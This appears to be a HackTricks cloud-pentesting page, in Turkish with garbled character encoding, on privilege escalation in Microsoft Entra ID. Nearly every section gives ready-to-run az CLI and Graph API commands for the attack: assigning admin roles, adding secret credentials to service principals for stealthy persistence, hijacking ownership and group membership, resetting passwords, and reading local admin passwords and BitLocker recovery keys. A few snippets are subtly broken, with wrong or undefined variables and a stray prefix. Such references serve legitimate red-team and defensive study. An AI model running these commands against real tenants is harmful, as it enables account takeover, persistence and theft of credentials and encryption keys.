# Az - EntraID Privesc

{% hint style="success" %}
AWS Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n:<img src="../../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
GCP Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n: <img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* **ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n ya da **Twitter'da** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**'i takip edin.**
* **Hacking ipuÃ§larÄ±nÄ± paylaÅŸmak iÃ§in** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gÃ¶nderin.

</details>
{% endhint %}

{% hint style="info" %}
**Entra ID'deki** yerleÅŸik rollerin **tÃ¼m ayrÄ±ntÄ±lÄ± izinleri** Ã¶zel rollerde kullanÄ±lmak Ã¼zere **uygun deÄŸildir.** 
{% endhint %}

## Roller

### Rol: AyrÄ±calÄ±klÄ± Rol YÃ¶neticisi <a href="#c9d4cde0-7dcc-45d5-aa95-59d198ae84b2" id="c9d4cde0-7dcc-45d5-aa95-59d198ae84b2"></a>

Bu rol, ilkeler iÃ§in roller atamak ve rollere daha fazla izin vermek iÃ§in gerekli ayrÄ±ntÄ±lÄ± izinleri iÃ§erir. Her iki eylem de ayrÄ±calÄ±klarÄ± artÄ±rmak iÃ§in kÃ¶tÃ¼ye kullanÄ±labilir.

* Bir kullanÄ±cÄ±ya rol atayÄ±n:
```bash
# List enabled built-in roles
az rest --method GET \
--uri "https://graph.microsoft.com/v1.0/directoryRoles"

# Give role (Global Administrator?) to a user
roleId="<roleId>"
userId="<userId>"
az rest --method POST \
--uri "https://graph.microsoft.com/v1.0/directoryRoles/$roleId/members/\$ref" \
--headers "Content-Type=application/json" \
--body "{
\"@odata.id\": \"https://graph.microsoft.com/v1.0/directoryObjects/$userId\"
}"
```
* Bir role daha fazla izin ekleyin:
```bash
# List only custom roles
az rest --method GET \
--uri "https://graph.microsoft.com/v1.0/roleManagement/directory/roleDefinitions" | jq '.value[] | select(.isBuiltIn == false)'

# Change the permissions of a custom role
az rest --method PATCH \
--uri "https://graph.microsoft.com/v1.0/roleManagement/directory/roleDefinitions/<role-id>" \
--headers "Content-Type=application/json" \
--body '{
"description": "Update basic properties of application registrations",
"rolePermissions": [
{
"allowedResourceActions": [
"microsoft.directory/applications/credentials/update"
]
}
]
}'
```
## Uygulamalar

### `microsoft.directory/applications/credentials/update`

Bu, bir saldÄ±rgana mevcut uygulamalara **kimlik bilgileri** (ÅŸifreler veya sertifikalar) ekleme imkanÄ± tanÄ±r. Uygulama ayrÄ±calÄ±klÄ± izinlere sahipse, saldÄ±rgan o uygulama olarak kimlik doÄŸrulamasÄ± yapabilir ve bu ayrÄ±calÄ±klarÄ± elde edebilir.
```bash
# Generate a new password without overwritting old ones
az ad app credential reset --id <appId> --append
# Generate a new certificate without overwritting old ones
az ad app credential reset --id <appId> --create-cert
```
### `microsoft.directory/applications.myOrganization/credentials/update`

Bu, `applications/credentials/update` ile aynÄ± eylemleri saÄŸlar, ancak tek dizin uygulamalarÄ± iÃ§in kapsamlÄ±dÄ±r.
```bash
az ad app credential reset --id <appId> --append
```
### `microsoft.directory/applications/owners/update`

**AÃ§Ä±klama**: UygulamalarÄ±n sahiplerini gÃ¼ncelle\
**KÃ¶tÃ¼ye KullanÄ±m Potansiyeli**: Kendilerini bir sahip olarak ekleyerek, bir saldÄ±rgan uygulamayÄ±, kimlik bilgileri ve izinler dahil olmak Ã¼zere manipÃ¼le edebilir.
```bash
az ad app owner add --id <AppId> --owner-object-id <UserId>
az ad app credential reset --id <appId> --append

# You can check the owners with
az ad app owner list --id <appId>
```
## Service Principals

### `microsoft.directory/servicePrincipals/credentials/update`

Bu, bir saldÄ±rganÄ±n mevcut hizmet ilkelerine kimlik bilgileri eklemesine olanak tanÄ±r. EÄŸer hizmet ilkesi yÃ¼kseltilmiÅŸ ayrÄ±calÄ±klara sahipse, saldÄ±rgan bu ayrÄ±calÄ±klarÄ± Ã¼stlenebilir.
```bash
az ad sp credential reset --id <sp-id> --append
```
{% hint style="danger" %}
Yeni oluÅŸturulan ÅŸifre web konsolunda gÃ¶rÃ¼nmeyecek, bu nedenle bu, bir hizmet ilkesi Ã¼zerinde kalÄ±cÄ±lÄ±ÄŸÄ± saÄŸlamak iÃ§in gizli bir yol olabilir.\
API'den ÅŸu ÅŸekilde bulunabilir: `az ad sp list --query '[?length(keyCredentials) > 0 || length(passwordCredentials) > 0].[displayName, appId, keyCredentials, passwordCredentials]' -o json`
{% endhint %}

EÄŸer `"code":"CannotUpdateLockedServicePrincipalProperty","message":"Property passwordCredentials is invalid."` hatasÄ±nÄ± alÄ±yorsanÄ±z, bunun nedeni **SP'nin passwordCredentials Ã¶zelliÄŸini deÄŸiÅŸtirmenin mÃ¼mkÃ¼n olmamasÄ±dÄ±r** ve Ã¶nce onu kilidini aÃ§manÄ±z gerekir. Bunun iÃ§in, ÅŸunu Ã§alÄ±ÅŸtÄ±rmanÄ±za izin veren bir izne ihtiyacÄ±nÄ±z var (`microsoft.directory/applications/allProperties/update`):

{% code overflow="wrap" %}
```bash
az rest --method PATCH --url https://graph.microsoft.com/v1.0/applications/<sp-object-id> --body '{"servicePrincipalLockConfiguration": null}'
```
{% endcode %}

### `microsoft.directory/servicePrincipals/synchronizationCredentials/manage`

Bu, bir saldÄ±rganÄ±n mevcut hizmet ilkelerine kimlik bilgileri eklemesine olanak tanÄ±r. EÄŸer hizmet ilkesi yÃ¼kseltilmiÅŸ ayrÄ±calÄ±klara sahipse, saldÄ±rgan bu ayrÄ±calÄ±klarÄ± Ã¼stlenebilir.
```bash
az ad sp credential reset --id <sp-id> --append
```
### `microsoft.directory/servicePrincipals/owners/update`

Uygulamalara benzer ÅŸekilde, bu izin bir hizmet ilkesine daha fazla sahip eklemeye olanak tanÄ±r. Bir hizmet ilkesine sahip olmak, onun kimlik bilgileri ve izinleri Ã¼zerinde kontrol saÄŸlar.
```bash
# Add new owner
spId="<spId>"
userId="<userId>"
az rest --method POST \
--uri "https://graph.microsoft.com/v1.0/servicePrincipals/$spId/owners/\$ref" \
--headers "Content-Type=application/json" \
--body "{
\"@odata.id\": \"https://graph.microsoft.com/v1.0/directoryObjects/$userId\"
}"

az ad sp credential reset --id <sp-id> --append

# You can check the owners with
az ad sp owner list --id <spId>
```
{% hint style="danger" %}
Yeni bir sahip ekledikten sonra, onu kaldÄ±rmaya Ã§alÄ±ÅŸtÄ±m ama API, DELETE yÃ¶nteminin desteklenmediÄŸini yanÄ±tladÄ±, oysa bu, sahibi silmek iÃ§in kullanmanÄ±z gereken yÃ¶ntem. Yani **gÃ¼nÃ¼mÃ¼zde sahipleri kaldÄ±ramazsÄ±nÄ±z**.
{% endhint %}

### `microsoft.directory/servicePrincipals/disable` ve `enable`

Bu izinler, hizmet ilkelerini devre dÄ±ÅŸÄ± bÄ±rakma ve etkinleÅŸtirme olanaÄŸÄ± saÄŸlar. Bir saldÄ±rgan, ayrÄ±calÄ±klarÄ± artÄ±rmak iÃ§in eriÅŸim saÄŸlayabileceÄŸi bir hizmet ilkesini etkinleÅŸtirmek iÃ§in bu izni kullanabilir.

Bu teknik iÃ§in saldÄ±rganÄ±n etkinleÅŸtirilen hizmet ilkesini ele geÃ§irmek iÃ§in daha fazla izne ihtiyacÄ± olacaÄŸÄ±nÄ± unutmayÄ±n.
```bash
bashCopy code# Disable
az ad sp update --id <ServicePrincipalId> --account-enabled false

# Enable
az ad sp update --id <ServicePrincipalId> --account-enabled true
```
#### `microsoft.directory/servicePrincipals/getPasswordSingleSignOnCredentials` & `microsoft.directory/servicePrincipals/managePasswordSingleSignOnCredentials`

Bu izinler, Ã¼Ã§Ã¼ncÃ¼ taraf uygulamalara eriÅŸim saÄŸlayabilecek tek oturum aÃ§ma iÃ§in kimlik bilgileri oluÅŸturma ve alma yetkisi verir.

{% code overflow="wrap" %}
```bash
# Generate SSO creds for a user or a group
spID="<spId>"
user_or_group_id="<id>"
username="<username>"
password="<password>"
az rest --method POST \
--uri "https://graph.microsoft.com/beta/servicePrincipals/$spID/createPasswordSingleSignOnCredentials" \
--headers "Content-Type=application/json" \
--body "{\"id\": \"$user_or_group_id\", \"credentials\": [{\"fieldId\": \"param_username\", \"value\": \"$username\", \"type\": \"username\"}, {\"fieldId\": \"param_password\", \"value\": \"$password\", \"type\": \"password\"}]}"


# Get credentials of a specific credID
credID="<credID>"
az rest --method POST \
--uri "https://graph.microsoft.com/v1.0/servicePrincipals/$credID/getPasswordSingleSignOnCredentials" \
--headers "Content-Type=application/json" \
--body "{\"id\": \"$credID\"}"
```
{% endcode %}

***

## Gruplar

### `microsoft.directory/groups/allProperties/update`

Bu izin, kullanÄ±cÄ±larÄ± ayrÄ±calÄ±klÄ± gruplara eklemeye olanak tanÄ±r ve bu da ayrÄ±calÄ±k yÃ¼kselmesine yol aÃ§ar.
```bash
az ad group member add --group <GroupName> --member-id <UserId>
```
**Not**: Bu izin, Entra ID rol atanabilir gruplarÄ±nÄ± hariÃ§ tutar.

### `microsoft.directory/groups/owners/update`

Bu izin, gruplarÄ±n sahibi olmayÄ± saÄŸlar. Bir grubun sahibi, grup Ã¼yeliÄŸini ve ayarlarÄ±nÄ± kontrol edebilir, bu da potansiyel olarak grubun ayrÄ±calÄ±klarÄ±nÄ± artÄ±rabilir.
```bash
az ad group owner add --group <GroupName> --owner-object-id <UserId>
az ad group member add --group <GroupName> --member-id <UserId>
```
**Not**: Bu izin, Entra ID rol atama gruplarÄ±nÄ± hariÃ§ tutar.

### `microsoft.directory/groups/members/update`

Bu izin, bir gruba Ã¼ye eklemeye olanak tanÄ±r. Bir saldÄ±rgan, kendisini veya kÃ¶tÃ¼ niyetli hesaplarÄ± ayrÄ±calÄ±klÄ± gruplara ekleyerek yÃ¼kseltilmiÅŸ eriÅŸim saÄŸlayabilir.
```bash
az ad group member add --group <GroupName> --member-id <UserId>
```
### `microsoft.directory/groups/dynamicMembershipRule/update`

Bu izin, dinamik bir gruptaki Ã¼yelik kuralÄ±nÄ± gÃ¼ncellemeye olanak tanÄ±r. Bir saldÄ±rgan, kendisini ayrÄ± bir ekleme olmadan ayrÄ±calÄ±klÄ± gruplara dahil etmek iÃ§in dinamik kurallarÄ± deÄŸiÅŸtirebilir.
```bash
groupId="<group-id>"
az rest --method PATCH \
--uri "https://graph.microsoft.com/v1.0/groups/$groupId" \
--headers "Content-Type=application/json" \
--body '{
"membershipRule": "(user.otherMails -any (_ -contains \"security\")) -and (user.userType -eq \"guest\")",
"membershipRuleProcessingState": "On"
}'
```
**Not**: Bu izin, Entra ID rol atanabilir gruplarÄ±nÄ± hariÃ§ tutar.

### Dinamik Gruplar Privesc

KullanÄ±cÄ±larÄ±n, dinamik gruplara Ã¼ye olarak eklenmek iÃ§in kendi Ã¶zelliklerini deÄŸiÅŸtirerek yetkilerini artÄ±rmalarÄ± mÃ¼mkÃ¼n olabilir. Daha fazla bilgi iÃ§in kontrol edin:

{% content-ref url="dynamic-groups.md" %}
[dynamic-groups.md](dynamic-groups.md)
{% endcontent-ref %}

## KullanÄ±cÄ±lar

### `microsoft.directory/users/password/update`

Bu izin, yÃ¶netici olmayan kullanÄ±cÄ±lara ÅŸifre sÄ±fÄ±rlama izni verir ve potansiyel bir saldÄ±rganÄ±n diÄŸer kullanÄ±cÄ±lara yetki artÄ±rmasÄ±na olanak tanÄ±r. Bu izin Ã¶zel rollere atanamaz.
```bash
az ad user update --id <user-id> --password "kweoifuh.234"
```
### `microsoft.directory/users/basic/update`

Bu ayrÄ±calÄ±k, kullanÄ±cÄ±nÄ±n Ã¶zelliklerini deÄŸiÅŸtirmeye olanak tanÄ±r. Ã–zellik deÄŸerlerine dayalÄ± olarak kullanÄ±cÄ± ekleyen dinamik gruplarÄ±n bulunmasÄ± yaygÄ±ndÄ±r, bu nedenle bu izin, bir kullanÄ±cÄ±nÄ±n belirli bir dinamik grubun Ã¼yesi olmak iÃ§in gerekli Ã¶zellik deÄŸerini ayarlamasÄ±na ve ayrÄ±calÄ±klarÄ± artÄ±rmasÄ±na olanak tanÄ±yabilir.

{% code overflow="wrap" %}
```bash
#e.g. change manager of a user
victimUser="<userID>"
managerUser="<userID>"
az rest --method PUT \
--uri "https://graph.microsoft.com/v1.0/users/$managerUser/manager/\$ref" \
--headers "Content-Type=application/json" \
--body '{"@odata.id": "https://graph.microsoft.com/v1.0/users/$managerUser"}'

#e.g. change department of a user
az rest --method PATCH \
--uri "https://graph.microsoft.com/v1.0/users/$victimUser" \
--headers "Content-Type=application/json" \
--body "{\"department\": \"security\"}"
```
{% endcode %}

## KoÅŸullu EriÅŸim PolitikalarÄ± ve MFA atlatma

YanlÄ±ÅŸ yapÄ±landÄ±rÄ±lmÄ±ÅŸ MFA gerektiren koÅŸullu eriÅŸim politikalarÄ± atlatÄ±labilir, kontrol edin:

{% content-ref url="az-conditional-access-policies-mfa-bypass.md" %}
[az-conditional-access-policies-mfa-bypass.md](az-conditional-access-policies-mfa-bypass.md)
{% endcontent-ref %}

## Cihazlar

### `microsoft.directory/devices/registeredOwners/update`

Bu izin, saldÄ±rganlarÄ±n cihazlarÄ±n sahipleri olarak kendilerini atamalarÄ±na ve cihazlara Ã¶zgÃ¼ ayar ve verilere eriÅŸim saÄŸlamalarÄ±na olanak tanÄ±r.
```bash
deviceId="<deviceId>"
userId="<userId>"
az rest --method POST \
--uri "https://graph.microsoft.com/v1.0/devices/$deviceId/owners/\$ref" \
--headers "Content-Type=application/json" \
--body '{"@odata.id": "https://graph.microsoft.com/v1.0/directoryObjects/$userId"}'
```
### `microsoft.directory/devices/registeredUsers/update`

Bu izin, saldÄ±rganlarÄ±n hesaplarÄ±nÄ± cihazlarla iliÅŸkilendirmesine ve eriÅŸim elde etmesine veya gÃ¼venlik politikalarÄ±nÄ± atlatmasÄ±na olanak tanÄ±r.
```bash
deviceId="<deviceId>"
userId="<userId>"
az rest --method POST \
--uri "https://graph.microsoft.com/v1.0/devices/$deviceId/registeredUsers/\$ref" \
--headers "Content-Type=application/json" \
--body '{"@odata.id": "https://graph.microsoft.com/v1.0/directoryObjects/$userId"}'
```
### `microsoft.directory/deviceLocalCredentials/password/read`

Bu izin, saldÄ±rganlarÄ±n Microsoft Entra'ya katÄ±lmÄ±ÅŸ cihazlar iÃ§in yedeklenmiÅŸ yerel yÃ¶netici hesap kimlik bilgilerini, ÅŸifre de dahil olmak Ã¼zere, okumalarÄ±na olanak tanÄ±r. 

{% code overflow="wrap" %}
```bash
# List deviceLocalCredentials
az rest --method GET \
--uri "https://graph.microsoft.com/v1.0/directory/deviceLocalCredentials"

# Get credentials
deviceLC="<deviceLCID>"
az rest --method GET \
--uri "https://graph.microsoft.com/v1.0/directory/deviceLocalCredentials/$deviceLCID?\$select=credentials" \
```
{% endcode %}

## BitlockerAnahtarlarÄ±

### `microsoft.directory/bitlockerKeys/key/read`

Bu izin, BitLocker anahtarlarÄ±na eriÅŸim saÄŸlar; bu da bir saldÄ±rganÄ±n sÃ¼rÃ¼cÃ¼leri ÅŸifrelerini Ã§Ã¶zmesine ve veri gizliliÄŸini tehlikeye atmasÄ±na olanak tanÄ±yabilir.

{% code overflow="wrap" %}
```bash
# List recovery keys
az rest --method GET \
--uri "https://graph.microsoft.com/v1.0/informationProtection/bitlocker/recoveryKeys"

# Get key
recoveryKeyId="<recoveryKeyId>"
az rest --method GET \
--uri "https://graph.microsoft.com/v1.0/informationProtection/bitlocker/recoveryKeys/$recoveryKeyId?\$select=key"
```
{% endcode %}

## DiÄŸer Ä°lginÃ§ Ä°zinler (TODO)

* `microsoft.directory/applications/permissions/update`
* `microsoft.directory/servicePrincipals/permissions/update`
* `microsoft.directory/applications.myOrganization/allProperties/update`
* `microsoft.directory/applications/allProperties/update`
* `microsoft.directory/servicePrincipals/appRoleAssignedTo/update`
* `microsoft.directory/applications/appRoles/update`
* `microsoft.directory/applications.myOrganization/permissions/update`

{% hint style="success" %}
AWS Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n:<img src="../../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
GCP Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n: <img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* **ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n ya da **Twitter'da** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**'i takip edin.**
* **Hacking ipuÃ§larÄ±nÄ± paylaÅŸmak iÃ§in** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gÃ¶nderin.

</details>
{% endhint %}
